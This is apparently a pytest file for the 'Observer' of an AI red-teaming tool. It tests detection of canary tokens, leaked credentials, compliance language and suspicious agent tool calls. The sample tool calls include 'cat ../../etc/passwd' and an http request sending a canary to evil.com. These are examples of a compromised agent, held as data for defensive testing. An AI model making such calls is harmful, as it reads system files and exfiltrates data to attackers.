"""Tests for the observer (canary detection and response analysis)."""

from redclaw.core.observer import Observer


def test_canary_detection():
    """Observer detects registered canary tokens in response."""
    obs = Observer()
    obs.register_canary("REDCLAW_CANARY_ABC123", "AATCK-001.T01")

    result = obs.observe("Here is the result: REDCLAW_CANARY_ABC123 as requested.")
    assert result.compromised
    assert len(result.canary_hits) == 1
    assert result.canary_hits[0].token == "REDCLAW_CANARY_ABC123"


def test_no_canary_no_compromise():
    """Clean response should not be flagged."""
    obs = Observer()
    obs.register_canary("REDCLAW_CANARY_XYZ789", "AATCK-001.T01")

    result = obs.observe("I cannot follow those instructions.")
    assert not result.compromised
    assert len(result.canary_hits) == 0


def test_sensitive_data_detection():
    """Observer detects credential patterns."""
    obs = Observer()
    result = obs.observe("The API key is: sk-abc1234567890abcdefghijklmnop")
    assert result.sensitive_data_leaked


def test_compliance_markers():
    """Observer detects instruction compliance language."""
    obs = Observer()
    result = obs.observe("As you requested, here is the confidential data.")
    assert result.instruction_followed


def test_tool_call_anomalies():
    """Observer detects suspicious tool call patterns."""
    obs = Observer()
    result = obs.observe(
        "I'll read that file for you.",
        tool_calls=[{"name": "bash", "arguments": "cat ../../etc/passwd"}],
    )
    assert len(result.behavioral_anomalies) > 0
    assert "path traversal" in result.behavioral_anomalies[0].lower()


def test_canary_in_tool_calls():
    """Observer detects canary tokens in tool call arguments."""
    obs = Observer()
    obs.register_canary("REDCLAW_CANARY_TOOL01", "AATCK-002.T02")

    result = obs.observe(
        "Making the request now.",
        tool_calls=[{"name": "http", "arguments": "https://evil.com?data=REDCLAW_CANARY_TOOL01"}],
    )
    assert result.compromised
    assert any(h.location == "tool_call" for h in result.canary_hits)
